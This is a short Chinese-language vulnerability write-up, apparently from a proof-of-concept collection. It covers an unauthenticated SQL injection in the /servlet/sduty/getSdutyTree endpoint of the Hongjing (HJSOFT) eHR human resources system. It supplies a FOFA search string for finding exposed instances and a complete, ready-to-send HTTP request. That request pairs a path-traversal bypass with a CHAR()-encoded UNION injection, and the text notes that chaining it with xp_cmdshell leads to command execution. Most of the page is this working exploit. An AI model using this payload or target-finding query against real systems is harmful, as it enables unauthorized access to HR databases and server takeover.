# 宏景eHR人力资源管理系统接口getSdutyTree存在SQL注入漏洞

宏景eHR /servlet/sduty/getSdutyTree 接口处存在sql注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。

## fofa

```
app="HJSOFT-HCM"
```

## poc

```yaml
GET /w_selfservice/oauthservlet/%2e./.%2e/servlet/sduty/getSdutyTree?param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407041356777.png)